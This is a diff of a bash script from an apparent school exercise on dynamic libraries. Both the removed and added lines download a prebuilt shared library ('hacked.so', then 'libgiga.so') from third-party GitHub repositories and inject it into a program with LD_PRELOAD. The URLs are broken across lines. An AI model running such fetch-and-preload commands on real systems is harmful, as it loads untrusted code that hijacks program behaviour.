@@ -1,4 +1,5 @@
 #!/bin/bash
-wget -P /tmp https://github.com/Nightburnn/alx-low_level_programming/raw/mai
-n/0x18-dynamic_libraries/hacked.so
-export LD_PRELOAD=/tmp/hacked.so
+wget -P .. https://raw.githubusercontent.com/monoprosito
+/holbertonschool-low_level_programming/master/0x18
+-dynamic_libraries/libgiga.so
+export LD_PRELOAD="$PWD/../libgiga.so"
